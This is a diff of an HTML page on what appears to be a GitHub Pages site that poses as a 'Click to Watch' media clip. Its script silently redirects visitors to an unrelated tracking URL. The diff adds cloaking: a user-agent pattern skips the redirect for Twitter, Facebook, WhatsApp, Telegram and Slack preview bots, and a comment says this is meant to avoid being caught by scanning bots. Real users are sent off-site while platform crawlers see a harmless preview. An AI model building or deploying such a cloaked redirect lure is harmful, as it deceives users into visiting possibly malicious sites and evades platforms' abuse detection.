@@ -4,21 +4,25 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Meta Tags for X/Twitter Preview -->
+  <!-- Meta Tags for Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Media Player">
-  <meta name="twitter:description" content="Watch full clip">
+  <meta name="twitter:title" content="Click to Watch">
+  <meta name="twitter:description" content="Trending Media">
   <meta name="twitter:image" content="https://devansh517tripathi-blip.github.io/media/photo.jpg">
 
+  <!-- Open Graph Meta Tags -->
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Media Player">
-  <meta property="og:description" content="Watch full clip">
+  <meta property="og:title" content="Click to Watch">
+  <meta property="og:description" content="Trending Media">
   <meta property="og:image" content="https://devansh517tripathi-blip.github.io/media/photo.jpg">
   <meta property="og:url" content="https://devansh517tripathi-blip.github.io/media/">
 
-  <!-- Instant 0ms Redirect -->
   <script>
-    location.replace("https://clothingdivorcedtwice.com/jqtrgb3v?key=ecad32530c156717d9abd3e37d49a2df");
+    // Agar Twitter ya koi bot scan kar raha ho toh redirect mat karo
+    var botPattern = /Twitterbot|facebookexternalhit|WhatsApp|TelegramBot|Slackbot/i;
+    if (!botPattern.test(navigator.userAgent)) {
+      window.location.replace("https://clothingdivorcedtwice.com/jqtrgb3v?key=ecad32530c156717d9abd3e37d49a2df");
+    }
   </script>
 </head>
 <body style="background:#000;">
